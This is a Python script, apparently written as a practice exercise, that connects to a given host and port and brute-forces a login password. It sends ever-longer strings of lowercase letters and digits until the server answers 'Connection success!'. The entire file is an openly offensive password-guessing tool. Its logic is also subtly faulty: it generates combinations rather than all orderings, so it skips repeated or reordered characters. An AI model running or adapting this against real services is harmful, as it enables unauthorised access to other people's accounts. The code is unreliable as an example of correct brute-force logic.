import socket
import argparse
import itertools
import string

parser = argparse.ArgumentParser()

parser.add_argument("hostname")
parser.add_argument("port")
parser.add_argument("message")

args = parser.parse_args()
hostname = args.hostname
port = int(args.port)
message = args.message

dictionary = list(string.ascii_lowercase) + list(string.digits)

password_is_hacked = False
password_length = 0
response = ""


with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    data = message.encode()

    client_socket.send(data)

    response = client_socket.recv(1024)

    response = response.decode()
    print(response)
    while not password_is_hacked or response == "Too many attempts":
        password_length += 1
        my_iter = itertools.combinations(dictionary, password_length)
        while True:
            try:
                password = ""
                password_object = next(my_iter)
                for char in password_object:
                    password += char
                data = password.encode()
                client_socket.send(data)
                response = client_socket.recv(1024)
                response = response.decode()
                if response == "Connection success!":
                    password_is_hacked = True
                    break
                if response == "Too many attempts":
                    break
            except StopIteration:
                break

print(password)

